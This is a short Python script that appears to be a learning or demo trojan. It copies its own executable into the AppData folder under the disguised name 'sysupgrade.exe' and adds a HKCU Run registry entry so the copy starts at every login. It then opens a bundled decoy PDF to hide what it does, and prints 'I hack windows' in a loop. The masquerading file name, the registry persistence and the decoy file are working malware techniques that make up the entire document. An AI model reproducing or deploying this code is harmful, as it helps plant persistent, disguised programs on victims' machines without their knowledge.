import time
import subprocess
import os
import shutil
import sys

def add_to_registery():
	new_file = os.environ["appdata"] + "\\sysupgrade.exe"
	if not os.path.exists(new_file):
		shutil.copyfile(sys.executable,new_file)
		regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
		subprocess.call(regedit_command,shell=True)

def open_added_file():
	added_file = sys._MEIPASS + "\\example.pdf"
	subprocess.Popen(added_file,shell=True)

add_to_registery()
open_added_file()
a = 0
while a<100:
	print("I hack windows")
	a+=1
	time.sleep(0.5)